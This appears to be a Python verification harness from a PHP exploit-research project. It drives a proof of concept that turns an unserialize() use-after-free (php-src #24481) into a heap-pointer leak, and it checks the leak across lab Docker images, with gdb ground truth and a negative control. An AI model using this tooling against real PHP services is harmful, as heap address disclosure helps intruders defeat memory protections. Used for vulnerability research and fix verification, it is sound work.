#!/usr/bin/env python3
"""Driver/verifier for var_destroy_ptr_leak.py -- php-src #24481's var_destroy
deferred-destructor reentry UAF as a userland IS_LONG heap-pointer leak.

Shows, on this project's labs, that a single ``unserialize()`` request makes a
heap pointer readable back from PHP userland as an **integer** (gettype()
"integer", serialize() -> ``i:<ptr>;``). Pure stdlib; safe under python3 -I.

Phases:
  (0) geometry   -- pure-python: the generated harness has a byte-correct object
                    token, a 2-page (capacity-256) packed reclaimer, and a
                    single-var_push scalar nested payload.
  (1) userland   -- run the PoC on every available CLI image and assert the
                    reclaimer element reflects as an IS_LONG heap pointer across
                    the serialize()/json_encode()/echo sinks; report reliability
                    per image and which versions reflect.
  (2) ground     -- gdb (cli-asan-gdb, USE_ZEND_ALLOC=1): at the UAF var_push
                    the stored value == rval and arData[0].u1.type_info stays
                    0x4 (IS_LONG). Skipped if the gdb image is absent.
  (3) negative   -- a nested payload that drives TWO var_push writes (a nested
                    array) clobbers element [0] to IS_NULL, not an integer:
                    confirms the leak is the var_push store, not random
                    corruption.

Usage:
    python3 -I verify_var_destroy_ptr_leak.py
    python3 -I verify_var_destroy_ptr_leak.py --runs 10 --no-gdb
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import tempfile

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import var_destroy_ptr_leak as poc

GDB_IMAGE = "cli-asan-gdb:latest"

# (image, expected PHP version prefix, needs USE_ZEND_ALLOC=1 forced)
#   stock/vuln images are non-ASAN (ZendMM on by default); ASAN images default
#   USE_ZEND_ALLOC=0, so the large-run reclaim needs it forced back on.
CANDIDATE_IMAGES = [
    ("php2shell-cli-stock:latest",      "8.4.26", True),
    ("php2shell-cli-asan:latest",       "8.4.26", True),
    ("php2shell-cli-asan-fixed:latest", "8.4.27", True),
    ("scratch-asan-8512:latest",        "8.5.12", True),
]

# x86_64 user heap/mmap pointers are canonical 47-bit; a live zval address from
# a fresh ZendMM page run reads as 0x00007............ (or, lower, 0x0000........).
ADDR_MIN = 0x010000000000      # above typical text/data; well into mmap range
ADDR_MAX = 0x0000FFFFFFFFFFFF


def _run(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8", "replace") + r.stderr.decode("utf-8", "replace")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        return -1, "[exec error: %r]" % e


def _image_exists(image):
    rc, _ = _run(["docker", "image", "inspect", image], timeout=30)
    return rc == 0


def _is_heap_ptr(v):
    return ADDR_MIN <= v <= ADDR_MAX


def phase0_geometry():
    print("\n[0] geometry / wiring (pure python)")
    ok = True
    php = poc.build_php()
    # byte-correct object token for the gadget class
    tok = 'O:%d:"%s":0:{}' % (len(poc.GADGET_CLASS), poc.GADGET_CLASS)
    ok &= tok in php
    print("    object token present :", tok in php, "->", tok)
    # >1018 outer values force the overflow var_entries chunk
    ok &= poc.OUTER_FILLER > 1018
    print("    outer filler > 1018  :", poc.OUTER_FILLER > 1018, "(%d)" % poc.OUTER_FILLER)
    # reclaimer capacity 256 (130..256 elems) -> 8 + 256*16 = 4104 B -> 2 pages,
    # matching the freed sizeof(var_entries)=8160 -> 2-page large run.
    ok &= 130 <= poc.GROOM_COUNT <= 256
    print("    groom count in 130..256 :", 130 <= poc.GROOM_COUNT <= 256, "(%d -> cap 256 -> 2 pages)" % poc.GROOM_COUNT)
    # nested must be a single-var_push scalar (parsed/echoed as the leak target)
    single = poc.NESTED.split(":", 1)[0] in ("i", "b", "d", "s", "O") and not poc.NESTED.startswith("a:")
    ok &= single
    print("    nested single-push   :", single, "(%r)" % poc.NESTED)
    print("    -> %s" % ("PASS" if ok else "FAIL"))
    return ok


def phase1_userland(runs):
    print("\n[1] userland IS_LONG heap-pointer leak (per image / version)")
    results = {}
    reflected_versions = []
    any_run = False
    for image, ver, zalloc in CANDIDATE_IMAGES:
        if not _image_exists(image):
            print("    %-34s : image absent (skipped)" % image)
            continue
        any_run = True
        ptrs = 0
        last = None
        for _ in range(runs):
            r = poc.leak(image, use_zend_alloc=zalloc)
            if r and r["hit"] >= 0 and r["type"] == "integer" and _is_heap_ptr(r["ptr"]):
                ptrs += 1
                last = r
        good = ptrs == runs and runs > 0
        results[image] = good
        if good and last:
            reflected_versions.append(last["ver"])
        samp = ("0x%012x" % last["ptr"]) if last else "-"
        print("    %-34s ver=%-7s : is_long_heap_ptr %d/%d  sample=%s  %s"
              % (image, last["ver"] if last else ver, ptrs, runs, samp,
                 "PASS" if good else "FAIL"))

    # reflecting-sink check on one working image
    sink_ok = None
    for image, ver, zalloc in CANDIDATE_IMAGES:
        if not _image_exists(image) or not results.get(image):
            continue
        rc, out = poc.run_docker(image, poc.build_php(), use_zend_alloc=zalloc)
        line = next((l for l in out.splitlines() if l.startswith("P2S24481_SINK")), "")
        ptr_line = poc.parse(out)
        if line and ptr_line:
            dec = str(ptr_line["ptr"])
            sink_ok = ("serialize=i:%s;" % dec in line) and ("json=%s" % dec in line) and ("echo=%s" % dec in line)
            print("    reflecting sinks on %s : serialize/json/echo emit i:%s -> %s"
                  % (image, dec, "PASS" if sink_ok else "FAIL"))
        break

    print("    versions reflecting the pointer :", sorted(set(reflected_versions)) or "none")
    if not any_run:
        print("    -> FAIL (no candidate image present)")
        return False
    ok = all(results.values()) and (sink_ok is not False)
    print("    -> %s" % ("PASS" if ok else "FAIL"))
    return ok


# gdb ground-truth script (run inside cli-asan-gdb; prints STORE_EQ_RVAL/TYPE)
_GDB_PY = r'''
import gdb
gdb.execute("set pagination off"); gdb.execute("set confirm off")
gdb.execute("set auto-load safe-path /")
S={'b':None,'r':None,'done':False}
class BP(gdb.Breakpoint):
    def stop(self):
        if S['done']: return False
        try:
            if int(gdb.parse_and_eval("var_hash->used_slots"))==-1:
                S['b']=int(gdb.parse_and_eval("(unsigned long)var_hash"))
                S['r']=int(gdb.parse_and_eval("(unsigned long)rval")); S['done']=True
                raw=bytearray(gdb.selected_inferior().read_memory(S['b']+8,16))
                print("GT_BEFORE base=0x%x rval=0x%x type=0x%08x"%(S['b'],S['r'],int.from_bytes(raw[8:12],'little')))
                return True
        except Exception as e: print("bp",e)
        return False
BP("var_unserializer.re:132")
gdb.execute("run -d memory_limit=512M /tmp/t.php")
gdb.execute("next")
raw=bytearray(gdb.selected_inferior().read_memory(S['b']+8,16))
val=int.from_bytes(raw[0:8],'little'); typ=int.from_bytes(raw[8:12],'little')
print("GT_AFTER value0=0x%x type=0x%08x"%(val,typ))
print("GT_STORE_EQ_RVAL=%d GT_TYPE_IS_LONG=%d"%(1 if val==S['r'] else 0, 1 if typ==4 else 0))
gdb.execute("continue"); gdb.execute("quit")
'''


def phase2_ground(enabled):
    print("\n[2] gdb ground-truth: var_push store == rval, type stays IS_LONG")
    if not enabled:
        print("    (disabled by --no-gdb)")
        return None
    if not _image_exists(GDB_IMAGE):
        print("    %s absent (skipped)" % GDB_IMAGE)
        return None
    rc, _ = _run(["docker", "run", "--rm", GDB_IMAGE, "sh", "-c", "command -v gdb"], timeout=40)
    if rc != 0:
        print("    gdb not in image (skipped)")
        return None
    with tempfile.NamedTemporaryFile("w", suffix=".php", delete=False) as fp:
        fp.write(poc.build_php())
        php_local = fp.name
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as fg:
        fg.write(_GDB_PY)
        gdb_local = fg.name
    try:
        cmd = ["docker", "run", "--rm",
               "-e", "USE_ZEND_ALLOC=1",
               "-e", "ASAN_OPTIONS=detect_leaks=0:abort_on_error=0",
               "-v", "%s:/tmp/t.php:ro" % php_local,
               "-v", "%s:/tmp/gt.py:ro" % gdb_local,
               GDB_IMAGE, "sh", "-c",
               "cd /tmp && gdb -q -batch -x /tmp/gt.py /usr/local/bin/php 2>&1"]
        rc, out = _run(cmd, timeout=180)
        for l in out.splitlines():
            if l.startswith("GT_"):
                print("    " + l)
        ok = "GT_STORE_EQ_RVAL=1 GT_TYPE_IS_LONG=1" in out
        print("    -> %s" % ("PASS" if ok else "FAIL"))
        return ok
    finally:
        for p in (php_local, gdb_local):
            try:
                os.unlink(p)
            except OSError:
                pass


def phase3_negative():
    print("\n[3] negative control: two-push nested array corrupts the type tag")
    # pick first working image
    img = None
    for image, ver, zalloc in CANDIDATE_IMAGES:
        if _image_exists(image):
            r = poc.leak(image, use_zend_alloc=zalloc)
            if r and r["hit"] >= 0:
                img = (image, zalloc)
                break
    if not img:
        print("    no working image (skipped)")
        return None
    image, zalloc = img
    # A nested array drives 2 var_push writes: the 2nd stores a pointer over
    # arData[0].u1.type_info (base+16), so element [0] is clobbered but its type
    # tag is corrupted to a non-integer (NULL / "unknown type" / etc, depending
    # on that pointer's low byte) -- it is NOT a clean integer. This localizes
    # the leak to the var_push store and shows the single-push requirement.
    r = poc.leak(image, nested='a:1:{i:0;i:9;}', use_zend_alloc=zalloc)
    corrupted = bool(r) and r["hit"] >= 0 and r["type"] != "integer"
    print("    %-34s nested='a:1:{i:0;i:9;}' : hit=%s type=%s (not integer) -> %s"
          % (image, r["hit"] if r else "-", r["type"] if r else "-",
             "PASS" if corrupted else "FAIL"))
    return corrupted


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--runs", type=int, default=8, help="userland runs per image")
    ap.add_argument("--no-gdb", action="store_true")
    args = ap.parse_args()

    print("=" * 70)
    print("verify #24481: var_destroy reentry UAF -> userland IS_LONG heap-ptr leak")
    print("=" * 70)

    p0 = phase0_geometry()
    p1 = phase1_userland(args.runs)
    p2 = phase2_ground(not args.no_gdb)
    p3 = phase3_negative()

    print("\n" + "=" * 70)
    print("  [0] geometry :", "PASS" if p0 else "FAIL")
    print("  [1] userland :", "PASS" if p1 else "FAIL")
    print("  [2] ground   :", ("PASS" if p2 else "FAIL") if p2 is not None else "SKIPPED")
    print("  [3] negative :", ("PASS" if p3 else "FAIL") if p3 is not None else "SKIPPED")
    mandatory = [p0, p1]
    ok = all(mandatory) and (p2 is not False) and (p3 is not False)
    print("=" * 70)
    print("RESULT:", "GREEN" if ok else "RED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
